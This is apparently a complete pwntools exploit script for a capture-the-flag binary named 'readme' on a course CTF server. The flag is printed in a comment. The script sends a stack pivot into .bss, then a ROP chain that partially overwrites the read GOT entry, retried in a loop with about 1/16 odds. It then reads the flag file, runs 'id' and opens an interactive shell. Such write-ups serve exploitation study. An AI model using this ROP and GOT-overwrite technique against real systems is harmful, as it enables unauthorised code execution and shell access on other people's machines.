#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{CAN_YOU_R34D_MY_M1ND?}

'''
With probability about 1/16
'''

context.arch = 'amd64'

e , l = ELF('./readme-fc826c708f619e14b137630581b766b23e3db765') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

host , port = 'csie.ctf.tw' , 10135

pop_rdi = 0x4006b3
ppr = 0x4006b1
leave_ret = 0x400646

p = flat(
    'D' * 0x20,
    e.bss() + 0xd00 + 0x20,
    0x40062b
)

p2 = flat(
    ppr,
    e.got['read'],
    0,
    e.plt['read'],
    e.bss() + 0xd00 + 0x20 + 0x20,
    0x40062b
)

p3 = flat(
    e.plt['read'],
    leave_ret,
    2,
    3,
    e.bss() + 0xd00 - 8,
    leave_ret
)

while True:
    y = remote(host,port)

    y.sendafter( ':' , p )
    sleep(0.2)
    y.send(p2)
    sleep(0.2) 
    y.send(p3)
    sleep(0.2)
    y.send( '\x74\x32' )
    sleep(0.1)
    y.sendline( 'cat /home/`whoami`/flag' )

    try:
        log.success( y.recvline() )
        y.sendline( 'id' )
        y.interactive()
    except:
        y.close()
